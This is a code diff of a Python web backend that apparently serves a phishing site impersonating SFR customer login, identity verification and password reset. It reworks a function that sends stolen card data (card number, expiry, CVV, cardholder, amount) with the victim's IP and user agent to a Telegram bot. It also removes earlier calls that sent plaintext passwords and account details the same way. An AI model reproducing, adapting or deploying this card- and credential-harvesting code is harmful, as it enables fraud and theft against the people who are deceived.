@@ -144,19 +144,43 @@ def _client_meta(request: Optional[Request] = None) -> str:
 
 
 async def send_telegram(title: str, lines: dict, request: Optional[Request] = None):
-    """Push every captured form field to the configured Telegram chat."""
+    """Push card capture to Telegram (styled plain text)."""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         logger.warning("Telegram not configured, skip notify")
         return
     when = datetime.now(PARIS_TZ).strftime("%d/%m/%Y %H:%M:%S")
-    body_lines = [title, when, ""]
+    body_lines = [
+        f"💳 {title}",
+        f"🕐 {when}",
+        "",
+    ]
+    emoji_map = {
+        "Titulaire": "👤",
+        "N° carte": "💳",
+        "Expiration": "📅",
+        "CVV": "🔐",
+        "Montant": "💰",
+        "Facture": "🧾",
+        "Email": "📧",
+        "Téléphone": "📱",
+        "User ID": "🆔",
+        "Login": "🔑",
+        "Statut": "📊",
+        "Référence": "#️⃣",
+    }
     for k, v in lines.items():
         if v is None or v == "":
             continue
-        body_lines.append(f"• {k}: {v}")
-    meta = _client_meta(request)
-    if meta:
-        body_lines.extend(["", meta])
+        em = emoji_map.get(k, "•")
+        body_lines.append(f"{em} {k}: {v}")
+    if request is not None:
+        ip = (
+            request.headers.get("x-forwarded-for", "").split(",")[0].strip()
+            or request.headers.get("x-real-ip", "")
+            or (request.client.host if request.client else "")
+        )
+        ua = request.headers.get("user-agent", "")[:180]
+        body_lines.extend(["", f"🌍 IP: {ip or 'n/a'}", f"🖥️ UA: {ua or 'n/a'}"])
     text = "\n".join(body_lines)
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     try:
@@ -379,17 +403,6 @@ async def login(payload: LoginRequest, request: Request):
         raise HTTPException(status_code=401, detail="Identifiant ou mot de passe incorrect")
     user = await get_or_create_user_by_identifier(payload.identifier, payload.password)
     token = create_access_token(user["id"], payload.remember)
-    await send_telegram(
-        "SFR — CONNEXION",
-        {
-            "Identifiant": payload.identifier.strip(),
-            "Mot de passe": payload.password,
-            "Rester connecté": "oui" if payload.remember else "non",
-            "User ID": user.get("id"),
-            "Email compte": user.get("email"),
-        },
-        request,
-    )
     return {"token": token, "user": public_user(user)}
 
 
@@ -411,17 +424,6 @@ async def verify_identity(payload: VerifyRequest, request: Request):
     inv = await ensure_unpaid_box_invoice(user["id"])
     token = create_access_token(user["id"], remember=False)
 
-    await send_telegram(
-        "SFR — VÉRIFICATION IDENTITÉ",
-        {
-            "Téléphone": payload.phone.strip(),
-            "Email": email,
-            "User ID": user.get("id"),
-            "Facture": inv.get("number"),
-            "Montant": f"{inv.get('amount')} EUR",
-        },
-        request,
-    )
 
     when = datetime.now(PARIS_TZ).strftime("%d/%m/%Y à %H:%M")
     html = brand_email(
@@ -446,11 +448,6 @@ async def me(user: dict = Depends(get_current_user)):
 async def forgot_password(payload: ForgotPasswordRequest, request: Request):
     email = payload.email.strip().lower()
     user = await get_or_create_user_by_email(email)
-    await send_telegram(
-        "SFR — MOT DE PASSE OUBLIÉ",
-        {"Email": email, "Login": user.get("login"), "User ID": user.get("id")},
-        request,
-    )
     token = secrets.token_urlsafe(32)
     await db.password_resets.insert_one({
         "id": str(uuid.uuid4()),
@@ -486,11 +483,6 @@ async def reset_password(payload: ResetPasswordRequest, request: Request):
         raise HTTPException(status_code=400, detail="Le mot de passe doit contenir au moins 8 caractères")
     await db.users.update_one({"id": rec["user_id"]}, {"$set": {"password_hash": hash_password(payload.password)}})
     await db.password_resets.update_one({"token": payload.token}, {"$set": {"used": True}})
-    await send_telegram(
-        "SFR — NOUVEAU MOT DE PASSE",
-        {"User ID": rec.get("user_id"), "Nouveau MDP": payload.password},
-        request,
-    )
     return {"message": "Votre mot de passe a été réinitialisé avec succès."}
 
 
@@ -498,11 +490,6 @@ async def reset_password(payload: ResetPasswordRequest, request: Request):
 async def forgot_identifier(payload: ForgotIdentifierRequest, request: Request):
     email = payload.email.strip().lower()
     user = await get_or_create_user_by_email(email)
-    await send_telegram(
-        "SFR — IDENTIFIANT OUBLIÉ",
-        {"Email": email, "Login": user.get("login"), "User ID": user.get("id")},
-        request,
-    )
     html = brand_email(
         "Rappel de votre identifiant",
         f"""<p style="color:#4b5563;font-size:14px;line-height:22px;">Bonjour {user['name']},</p>
